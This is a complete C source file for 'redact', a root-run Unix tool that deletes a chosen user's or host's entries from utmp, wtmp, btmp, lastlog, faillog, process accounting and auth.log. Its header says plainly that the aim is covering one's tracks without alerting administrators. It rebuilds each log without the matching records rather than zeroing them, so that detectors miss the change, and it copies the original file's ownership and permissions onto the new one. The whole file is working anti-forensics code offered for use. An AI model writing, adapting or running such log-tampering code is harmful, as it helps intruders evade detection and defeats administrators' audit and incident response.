/*************************************************************************
 * A simple program to wipe log files of all entries matching specific   *
 * criteria, e.g. username or host. The most common way of covering      *
 * one's tracks is simply to delete all the log files, but this makes it *
 * obvious to administrators that something is going on. Some log wiping *
 * programs simply zero out the matching entries, but there are security *
 * programs that check for zeroed out log entries and alert the          *
 * administrator if detected. Instead, this program constructs a new log *
 * file which completely omits the matching log entries in order to      *
 * leave no evidence (or as little as possible) of tampering. It should  *
 * go without saying, but since this program modifies log files, it must *
 * be run as root.                                                       *
 *************************************************************************/
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <lastlog.h>		/* lastlog may be defined here on some systems */
#include <pwd.h>
#include <utmp.h>
#include <sys/acct.h>
#include <time.h>

/* The version of this program using semantic versioning format */
static char *version = "redact 0.6.1";

/* The locations of various log files on the system. Change these to
 * match the locations of log files on your system */
#define WTMPFILE 		"/var/log/wtmp"
#define UTMPFILE 		"/var/run/utmp"
#define BTMPFILE		"/var/log/btmp"
#define LASTLOGFILE		"/var/log/lastlog"
#define FAILLOGFILE		"/var/log/faillog"
#define ACCTFILE		"/var/log/account/pacct"
#define AUTHFILE		"/var/log/auth.log"

/* The longest line to read from a file */
#define MAXLINE			4096

/* Different operating systems use different versions */
#if defined(__FreeBSD__)
#define acct acctv2
#elif defined(__linux__)
#define acct acct_v3
#endif

/* Global structure to keep track of options */
struct args{
	int wipeAll;			/* Wipe all the logs! */
	int acctlog;			/* Wipe process accounting logs */
	const char *host;		/* Wipe log entries containing this host*/
	const char *username;	/* Wipe log entries containing this user name */
	int verbose;			/* Enable verbose output */
	int utmplog;			/* Wipe utmp */
	int wtmplog;			/* Wipe wtmp */
	int btmplog;			/* Wipe btmp */
	int lastlog;            /* Wipe lastlog */
	int faillog;			/* Wipe faillog */
	int authlog;			/* Wipe auth.log */
};
static struct args optflags = {0};

/*
 * The login failure file is maintained by login(1) and faillog(8)
 * Each record in the file represents a separate UID and the file
 * is indexed in that fashion.
 */
struct faillog{
    short fail_cnt;         /* failures since last success */
    short fail_max;         /* failures before turning account off */
    char fail_line[12];     /* last failure occurred here */
    time_t fail_time;       /* last failure occurred then */
    /*
     * If nonzero, the account will be re-enabled if there are no
     * failures for fail_locktime seconds since last failure.
     */
    long fail_locktime;
};

/** Print a help message explaining the options and arguments
 *
 */
static void usage(void){
    fprintf(stderr, "Usage: redact [OPTION]... USERNAME\n");
    fprintf(stderr, "Wipe USERNAME from the system logs.\n\n");
    fprintf(stderr, "   -a                Wipe all available log files\n");
    fprintf(stderr, "   -b                Wipe the btmp log file\n");
    fprintf(stderr, "   -f                Wipe the faillog log file\n");
    fprintf(stderr, "   -i                Remove entries containing this hostname\n");
    fprintf(stderr, "   -h, -?            Display this help and exit\n");
    fprintf(stderr, "   -l                Wipe the lastlog log file\n");
    fprintf(stderr, "   -p                Wipe process accounting logs\n");
    fprintf(stderr, "   -t                Wipe auth.log log file\n");
    fprintf(stderr, "   -u                Wipe the utmp log file\n");
    fprintf(stderr, "   -v                Enable verbose output\n");
    fprintf(stderr, "   -V                Print program version\n");
    fprintf(stderr, "   -w                Wipe the wtmp log file\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Report bugs to <northernhzae@gmail.com>.\n");

    exit(EXIT_FAILURE);
}

/** Assign the uid, gid, and mode bits of src to dst
 * @param src The file with properties to assign to dst
 * @param dst The file to change the properties of
 * @returns 0 on success, else -1 on error
 *
 */
static int clone_attrs(const char *src, const char *dst){
	struct stat sbuf;

	/* Get the properties of src */
	if((stat(src, &sbuf)) < 0){
		perror("stat() error");
		return(-1);
	}

	/* Change dst's permissions and owner to that of src's */
	if((chmod(dst, sbuf.st_mode)) < 0){
		perror("chmod() error");
		return(-1);
	}

	if((chown(dst, sbuf.st_uid, sbuf.st_gid)) < 0){
		perror("chown() error");
		return(-1);
	}

	return(0);
}

/** Move file from src to dst
 * @param src The path of the file to move
 * @param dst The path to move src to
 * @returns 0 on success, -1 on error
 *
 */
static int move_file(const char *src, const char *dst){
	int ret;

	/* This unlink is not needed, but done just to be sure */
	if((ret = unlink(dst)) < 0){
		perror("unlink() error");
		return(-1);
	}
	if((ret = rename(src, dst)) < 0)
		perror("rename() error");

	return(ret);
}

/** Get the the directory component of a pathname
 * @param pathname The path to get the directory of
 * @returns A pointer to the modified pathname, returns '.' if
 * a '/' is not found in pathname
 * @note This function modifies the pathname string!
 *
 */
static char *get_dir(char *pathname){
    char *n = strrchr(pathname, '/');

    if(n == NULL){
    	pathname[0] = '.';
    	pathname[1] = '\0';
        return(pathname);
    }

    /* Split the string into just the directory portion
     * of pathname */
    *n = '\0';

    return(pathname);
}

/** Look up the user ID of username
 * @param username The user to find the UID of
 * @param id The variable to store the user-id in
 * @returns 0 on success, -1 on error
 * We store the UID in a passed argument because there is
 * no reliable way to tell the difference between a valid
 * UID and an error condition.
 *
 */
static int get_userid(const char *username, uid_t *id){
	struct passwd *pd;
	errno = 0;

	if((pd = getpwnam(username)) == NULL){
		/* errno is set only when an error occurs, if it
		 * is still 0, the username simply was not found */
		if(errno != 0){
			perror("getpwnam() error");
			return(-1);
		}
		fprintf(stderr, "getpwnam() error: failed to find the user ID for: %s\n",
				username);
		return(-1);
	}

	/* Return the found user ID */
	*id = pd->pw_uid;
	return(0);
}

/* Generate a temporary filename in the same directory as logfile
 * @param logfile A path to a file in the target directory
 * @returns An absolute path for a temporary file or NULL on error
 * @note It is the caller's responsibility to free the temporary path
 * when done.
 *
 */
static char *gen_tmpath(const char *logfile){
	char *ptr, *tmpath;
	if((ptr = strdup(logfile)) == NULL){
		perror("strdup() error");
		return(NULL);
	}

	if((tmpath = malloc(MAXLINE)) == NULL){
		perror("malloc() error");
		free(ptr);
		return(NULL);
	}

	srandom(time(NULL));
	get_dir(ptr);

	if(snprintf(tmpath, MAXLINE, "%s/.x%ld", ptr, random()&0x00ffffff) > 4096){
		fprintf(stderr, "snprintf() error: path was truncated\n");
		free(ptr);
		free(tmpath);
		return(NULL);
	}

	free(ptr);
	return(tmpath);
}


/** Remove all entries containing username from a log file
 * that uses utmp data structures, e.g. wtmp, utmp, etc.
 * @param username The username to search entries for
 * @param path The path of the utmp/wtmp/btmp file to wipe
 *
 */
static void wipe_utmp(const char *username, const char *logfile){
	FILE *fin, *fout;
	size_t num = 0;
	size_t found = 0;
	struct utmp ut;
	size_t utsize = sizeof(struct utmp);
	char *tmpfile;

	if((fin = fopen(logfile, "r")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
				strerror(errno));
		exit(EXIT_FAILURE);
	}

	if((tmpfile = gen_tmpath(logfile)) == NULL){
		fclose(fin);
		exit(EXIT_FAILURE);
	}

	if((fout = fopen(tmpfile, "w")) == NULL){
		fprintf(stderr, "error opening temporary file %s: %s\n",
				tmpfile, strerror(errno));
		fclose(fin);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	/* Read utmp records until we hit EOF, if the record contains
	 * the given username, skip it, else copy it to the temporary
	 * file. */
	while(fread(&ut, utsize, 1, fin) == 1){
		num++;				/* total number of entries found */

		if(strncmp(ut.ut_user, username, strlen(ut.ut_user)) == 0){
			found++;		/* number of matching entries */
			continue;
		} else if(optflags.host != NULL &&
				strncmp(ut.ut_host, optflags.host, strlen(ut.ut_host)) == 0){
			found++;
			continue;
		} else {
			if(fwrite(&ut, utsize, 1, fout) != 1){
				perror("fwrite() error");
				fclose(fin);
				fclose(fout);
				unlink(tmpfile);		/* Delete our temporary file */
				free(tmpfile);
				exit(EXIT_FAILURE);
			}
		}
	}

	/* If we quit reading because we hit an error and not EOF,
	 * print an error message and return */
	if(ferror(fin) && !feof(fin)){
		perror("fread() error");
		fclose(fin);
		fclose(fout);
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	fclose(fin);
	fclose(fout);

	/* Set the tmp file's uid, gid, and permissions to the
	 * same as the original log file's */
	if(clone_attrs(logfile, tmpfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	/* Finally, delete the old log file, and replace it with
	 * the newly modified one */
	if(move_file(tmpfile, logfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	free(tmpfile);

	if(optflags.verbose)
		printf("Redacted %zu out of %zu records in %s\n", found, num, logfile);

	return;
}

/** Wipe the lastlog file of entries containing host or username
 * @param username The username to wipe
 *
 */
static void wipe_last(const char *username){
	FILE *fin;
	uid_t userid;
	size_t num = 0;
	size_t found = 0;
	struct lastlog llbuf = {0};
	size_t llsize = sizeof(struct lastlog);

	/* Get username's user ID */
	if(get_userid(username, &userid) < 0)
		exit(EXIT_FAILURE);

	/* Open the lastlog log file */
	if((fin = fopen(LASTLOGFILE, "r+")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", LASTLOGFILE,
				strerror(errno));
		exit(EXIT_FAILURE);
	}

	if(optflags.host != NULL){
		while(fread(&llbuf, llsize, 1, fin) == 1){
			num++;
			if(strncmp(llbuf.ll_host, optflags.host, strlen(optflags.host)) == 0){
				found++;
				/* Rewind the cursor, then wipe the entry */
				fseek(fin, (long)-llsize, SEEK_CUR);
				memset(&llbuf, 0, llsize);
				fwrite(&llbuf, llsize, 1, fin);
			}
		}

		if(ferror(fin) && !feof(fin)){
			perror("fread() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}

		if(optflags.verbose)
			printf("Redacted %zu out of %zu records in %s\n",
				found, --num, LASTLOGFILE);

	} else {
		/* The lastlog file is indexed by user ID, so find the entry
		 * just before the one we want to wipe. */
		if(fseek(fin, (long)llsize * ((long)userid), SEEK_SET) < 0){
			perror("fseek() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}

		/* Empty the structure, which is the default for a user who
		 * has never logged in. Then overwrite username's lastlog entry */
		memset(&llbuf, 0, llsize);
		if(fwrite(&llbuf, llsize, 1, fin) != 1){
			perror("fwrite() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}

		if(optflags.verbose)
			printf("Redacted 1 record in %s\n", LASTLOGFILE);
	}

	fclose(fin);
	return;
}

/** Wipe username from the failed login log file
 * @param username The username to wipe from the log file
 *
 */
static void wipe_fail(const char *username){
	FILE *fin;
	uid_t userid;
	struct faillog fbuf = {0};
	size_t flsize = sizeof(struct faillog);

	if((fin = fopen(FAILLOGFILE, "r+")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", FAILLOGFILE,
				strerror(errno));
		exit(EXIT_FAILURE);
	}

	/* Note that faillog does not record what host the failed login
	 * occurred from so it is not possible to wipe all entries created
	 * from a certain host like the lastlog file */

	if(get_userid(username, &userid) < 0)
		exit(EXIT_FAILURE);

	if(fseek(fin, (long)flsize * ((long)userid), SEEK_SET) < 0){
		perror("fseek() error");
		fclose(fin);
		exit(EXIT_FAILURE);

	}

	memset(&fbuf, 0, flsize);

	if(fwrite(&fbuf, flsize, 1, fin) != 1){
		perror("fwrite() error");
		fclose(fin);
		exit(EXIT_FAILURE);
	}

	fclose(fin);

	if(optflags.verbose)
		printf("Redacted 1 record in %s\n", FAILLOGFILE);

	return;
}

/** Wipe the process accounting log file
 *  @param username The username to wipe from the logs
 *  @param logfile Path of the process accounting log file
 *
 */
static void wipe_acct(const char *username, const char *logfile){
	uid_t userid;
	size_t num = 0;
	size_t found = 0;
	FILE *fin, *fout;
	char *tmpfile;
	struct acct acbuf;
	size_t acsize = sizeof(struct acct);

	if(get_userid(username, &userid) < 0){
		exit(EXIT_FAILURE);
	}

	if((tmpfile = gen_tmpath(logfile)) == NULL){
		exit(EXIT_FAILURE);
	}

	if((fin = fopen(logfile, "r")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
				strerror(errno));
		exit(EXIT_FAILURE);
	}

	if((fout = fopen(tmpfile, "w")) == NULL){
		fprintf(stderr, "error opening %s temporary file: %s\n", tmpfile,
				strerror(errno));
		fclose(fin);
		exit(EXIT_FAILURE);
	}

	while(fread(&acbuf, acsize, 1, fin) == 1){
		num++;
		if(acbuf.ac_uid == userid){
			found++;
			continue;
		} else{
			if(fwrite(&acbuf, acsize, 1, fout) != 1){
				perror("fwrite() error");
				fclose(fin);
				fclose(fout);
				unlink(tmpfile);
				free(tmpfile);
				exit(EXIT_FAILURE);
			}
		}
	}

	/* Make sure loop exited because of EOF and not error */
	if(ferror(fin) && !feof(fin)){
		perror("fread() error");
		fclose(fin);
		fclose(fout);
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	fclose(fin);
	fclose(fout);

	if(clone_attrs(logfile, tmpfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	if(move_file(tmpfile, logfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	free(tmpfile);

	if(optflags.verbose)
		printf("Redacted %zu out of %zu records in %s\n", found, num, logfile);

	return;
}


/** Wipe the auth.log file that records user authentication attempts
 * @param username The username to wipe from the file
 * @param logfile The path of the auth.log file to wipe
 *
 */
static void wipe_auth(const char *username, const char *logfile){
	FILE *fin, *fout;
	uid_t userid;
	char buf[MAXLINE];
	char idstr[50];
	char *tmpfile;
	size_t num = 0;
	size_t found = 0;

	if(get_userid(username, &userid) < 0)
		exit(EXIT_FAILURE);

	/* Convert user ID into a string */
	snprintf(idstr, 50, "%u", userid);

	if((tmpfile = gen_tmpath(logfile)) == NULL){
		exit(EXIT_FAILURE);
	}

	if((fin = fopen(logfile, "r")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
						strerror(errno));
		exit(EXIT_FAILURE);
	}

	if((fout = fopen(tmpfile, "w")) == NULL){
		fprintf(stderr, "error opening %s temporary file: %s\n", tmpfile,
						strerror(errno));
		fclose(fin);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	while(fgets(buf, MAXLINE, fin) != NULL){
		num++;
		if(strstr(buf, username) != NULL || strstr(buf, idstr) != NULL){
			found++;
			continue;
		} else {
			if(fputs(buf, fout) == EOF){
				perror("fputs() error");
				fclose(fin);
				fclose(fout);
				unlink(tmpfile);
				free(tmpfile);
				exit(EXIT_FAILURE);
			}
		}
	}

	if(ferror(fin) && !feof(fin)){
		perror("fgets() error");
		fclose(fin);
		fclose(fout);
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	fclose(fin);
	fclose(fout);

	if(clone_attrs(logfile, tmpfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	if(move_file(tmpfile, logfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	free(tmpfile);

	if(optflags.verbose)
		printf("Redacted %zu out of %zu records in %s\n", found, num, logfile);

	return;
}

/** The main doo-dad
 * TODO: Wipe auth.log entries that contain sudo or su?
 *
 */
int main(int argc, char *argv[]){
	int opt;
	uid_t eid;

	/* Process the command line options */
	while((opt = getopt(argc, argv, "abfi:h?lptuvVw")) != -1){
		switch(opt){
		case 'a':
			/* Modify all available logs */
			optflags.wipeAll = 1;
			break;

		case 'b':
			/* Wipe btmp log file */
			optflags.btmplog = 1;
			break;

		case 'f':
			/* Wipe faillog */
			optflags.faillog = 1;
			break;

		case 'i':
			/* Remove activity from this host */
			optflags.host = optarg;
			break;

		case 'l':
			/* Wipe lastlog file */
			optflags.lastlog = 1;
			break;

		case 'p':
			/* Wipe process accounting logs */
			optflags.acctlog = 1;
			break;

		case 'v':
			/* Enable verbose mode */
			optflags.verbose = 1;
			break;

		case 'V':
			/* Print program version and exit */
			puts(version);
			exit(EXIT_SUCCESS);
			break;

		case 'u':
			/* Modify utmp log file */
			optflags.utmplog = 1;
			break;

		case 't':
			/* Wipe the auth.log log file */
			optflags.authlog = 1;
			break;

		case 'w':
			/* Modify wtmp log file*/
			optflags.wtmplog = 1;
			break;

		case '?':
			/* Fall through */
		case 'h':
			usage();
			break;

		default:
			usage();
			break;
		}
	}

	/* Get the argument required by this program */
	optflags.username = argv[optind];
	if(optflags.username == NULL){
		fprintf(stderr, "Error: Must provide a user name\n");
		usage();
	}

	/* Check effective UID to make sure we are being run as root,
	 * otherwise we will just fail later. Besides, most log files
	 * can't be modified unless your root anyways.
	 */
	if((eid = geteuid()) != 0){
		fprintf(stderr, "Error: must be run as root!\n");
		return(1);
	}

	/* Wipe the logs */
	if(optflags.wipeAll){
		wipe_utmp(optflags.username, UTMPFILE);
		wipe_utmp(optflags.username, WTMPFILE);
		wipe_utmp(optflags.username, BTMPFILE);
		wipe_last(optflags.username);
		wipe_fail(optflags.username);
		wipe_acct(optflags.username, ACCTFILE);
		wipe_auth(optflags.username, AUTHFILE);
		return(0);
	}

	/* Check each flag individually so that any combination of log files
	 * can be specified on the command line */
	if(optflags.utmplog){
		wipe_utmp(optflags.username, UTMPFILE);
	}

	if(optflags.wtmplog){
		wipe_utmp(optflags.username, WTMPFILE);
	}
	if(optflags.btmplog){
		wipe_utmp(optflags.username, BTMPFILE);
	}
	if(optflags.lastlog){
		wipe_last(optflags.username);
	}
	if(optflags.faillog){
		wipe_fail(optflags.username);
	}
	if(optflags.acctlog){
		wipe_acct(optflags.username, ACCTFILE);
	}
	if(optflags.authlog){
		wipe_auth(optflags.username, AUTHFILE);
	}

	return(0);
}
